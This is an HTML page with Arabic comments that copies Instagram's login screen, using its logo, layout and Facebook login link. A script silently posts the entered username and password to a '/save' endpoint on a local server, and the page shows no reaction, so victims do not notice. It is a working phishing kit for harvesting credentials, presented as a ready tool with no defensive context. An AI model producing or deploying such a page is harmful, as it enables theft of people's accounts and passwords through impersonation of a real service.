<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>تسجيل الدخول • إنستغرام</title>
<style>
    body {
        background-color: #fafafa;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }

    .login-box {
        background-color: white;
        border: 1px solid #dbdbdb;
        border-radius: 1px;
        padding: 20px 40px;
        width: 350px;
        text-align: center;
        position: relative;
    }

    .logo {
        width: 175px;
        margin: 22px auto 12px;
    }

    .input-field {
        width: 100%;
        padding: 9px 8px 7px;
        margin-bottom: 6px;
        background: #fafafa;
        border: 1px solid #dbdbdb;
        border-radius: 3px;
        font-size: 12px;
        color: #262626;
    }

    .login-button {
        width: 100%;
        background-color: #0095f6;
        color: white;
        border: none;
        border-radius: 4px;
        padding: 7px 16px;
        font-weight: 600;
        margin-top: 8px;
        cursor: pointer;
    }

    .divider {
        display: flex;
        align-items: center;
        margin: 10px 0 18px;
    }

    .divider-line {
        flex-grow: 1;
        height: 1px;
        background-color: #dbdbdb;
    }

    .divider-text {
        margin: 0 18px;
        color: #8e8e8e;
        font-weight: 600;
        font-size: 13px;
        text-transform: uppercase;
    }

    .fb-login {
        color: #385185;
        font-weight: 600;
        font-size: 14px;
        margin: 8px 0;
        cursor: pointer;
    }

    .forgot-password {
        color: #00376b;
        font-size: 12px;
        margin-top: 12px;
        cursor: pointer;
    }

    /* رسالة التنبيه - مخفية الآن */
    #error-message {
        color: red;
        font-size: 14px;
        margin-top: 10px;
        display: none; /* لا تظهر الآن */
    }
</style>
</head>
<body>
<div class="login-box">
    <!-- شعار إنستغرام -->
    <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" />

    <!-- النموذج لتسجيل الدخول -->
    <form id="loginForm" action="http://127.0.0.1:5000/save" method="post" onsubmit="return handleSubmit(event)">
        <!-- اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف -->
        <input class="input-field" type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف" required>
        <!-- كلمة السر -->
        <input class="input-field" type="password" name="password" placeholder="كلمة السر" required>
        <!-- زر تسجيل الدخول -->
        <button class="login-button" type="submit">تسجيل الدخول</button>
    </form>

    <!-- رسالة الخطأ (مخفية حالياً) -->
    <div id="error-message"></div>

    <!-- الفاصل -->
    <div class="divider">
        <div class="divider-line"></div>
        <div class="divider-text">أو</div>
        <div class="divider-line"></div>
    </div>

    <!-- تسجيل الدخول باستخدام فيسبوك -->
    <div class="fb-login">
        تسجيل الدخول باستخدام فيسبوك
    </div>

    <!-- نسيت كلمة السر -->
    <div class="forgot-password">نسيت كلمة السر؟</div>
</div>

<script>
    function handleSubmit(event) {
        event.preventDefault(); // إيقاف الإرسال التلقائي

        const form = document.getElementById('loginForm');
        const formData = new FormData(form);

        // إرسال البيانات إلى السيرفر بدون أي تفاعل مرئي
        fetch('http://127.0.0.1:5000/save', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            // لا تفعل شيئًا، الصفحة تبقى كما هي
        })
        .catch(error => {
            // يمكن تجاهل الأخطاء أو تسجيلها في الكونسول فقط
            console.error('خطأ في الاتصال بالسيرفر:', error);
        });

        return false; // لمنع النموذج من الإرسال التقليدي
    }
</script>
</body>
</html>
